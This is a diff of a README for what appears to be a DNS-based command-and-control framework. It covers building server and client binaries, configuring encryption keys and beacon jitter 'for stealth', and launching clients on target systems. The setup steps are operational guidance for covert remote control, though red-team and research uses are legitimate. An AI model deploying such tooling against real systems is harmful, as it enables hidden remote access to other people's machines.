@@ -38,70 +38,61 @@ Set up your domain with glue records pointing to your server:
 - Configure NS records: `ns1.yourdomain.net` and `ns2.yourdomain.net` pointing to your server IP
 - Ensure your registrar has proper glue records configured
 
-#### 2. Configure the client
-Edit `Client/build_config.json` as this config is used at buildtime:
-```json
-{
-  "server_domain": "secwolf.net",
-  "dns_server": "",
-  "query_type": "TXT",
-  "encoding": "aes-gcm-base36",
-  "encryption_key": "MySecretC2Key123!@#DefaultChange",
-  "timeout": 10,
-  "max_command_length": 800,
-  "retry_attempts": 3,
-  "sleep_min": 5,
-  "sleep_max": 15
-}
+#### 2. Configure Server/Client
+Make necessary adjustments in build_config.json, the builder tool will utilize this file during buildtime to configure your server and clients.
+- Ensure `bind_addr` is correct for your server's external IP
+- `server_address` is the public IP of your server
+- For verbose debugging, change `debug` to true
+- Client DNS can be set manualy at `dns_server` (Not recommended)
+- Client heartbeat can be changed with `sleep_min` and `sleep_max`
+
+#### 3. Build
+Run build scripts for your OS
+
+- Windows
+```powershell
+.\build.bat
 ```
-- `dns_server`: Leave empty to use system DNS (recommended) or specify custom DNS server
-- `encoding`: Use "aes-gcm-base36" for encrypted reliable encoding
-- `encryption_key`: AES encryption key for C2 traffic (must match on both client/server)
-- `max_command_length`: Increased to 800 to handle chunked result metadata
-- `sleep_min/max`: Beacon interval randomization for operational security
-
-
-#### 3. Build the binaries
+- Linux
 ```bash
-# Server
-cd Server
-go build -o dns-server .
-
-# Client  
-cd ../Client
-go build -o dns-client .
+chmod +x build.sh
+./build.sh`
 ```
 
-#### 4. Configure the server
-Edit `Server/config.json`, this config must be in the same directory as the compiled server for use:
-```json
-{
-  "bind_addr": "0.0.0.0",
-  "bind_port": 53,
-  "domain": "secwolf.net",
-  "ns1": "ns1.secwolf.net", 
-  "ns2": "ns2.secwolf.net",
-  "forward_dns": true,
-  "upstream_dns": "8.8.8.8:53",
-  "encryption_key": "MySecretC2Key123!@#DefaultChange",
-  "debug": false
-}
+**Build output**
+
+All build artifacts are placed in the `build/` directory:
+
 ```
-- `forward_dns`: Enable DNS forwarding for legitimate queries (recommended for stealth)
-- `upstream_dns`: DNS server to forward legitimate queries to
-- `debug`: Enable detailed logging for troubleshooting
+build/
+├── dns-server-linux          # Linux server binary
+├── dns-client-windows.exe    # Windows client binary  
+├── dns-client-linux          # Linux client binary
+└── deployment_info.json      # Build and deployment information
+```
 
-
-#### 5. Deploy and run
+#### 4. Disable systemd-resolved on Server host
 ```bash
-# On your server (requires root for port 53)
-sudo ./dns-server
-
-# On target systems
-./dns-client
+sudo systemctl stop systemd-resolved
 ```
 
-#### 6. C2 Operations
+#### 5. Start server
+```bash
+sudo ./dns-server-linux
+```
+
+#### 6. Launch client
+- Linux
+```bash
+#sudo if possible!
+./dns-client-linux
+```
+- Windows
+```powershell
+.\dns-client-windows.exe
+```
+
+#### 7. C2 Operations
 The server includes an interactive console for managing beacons and issuing commands. Use `help` for available commands.
 
 **Interactive Console Commands**
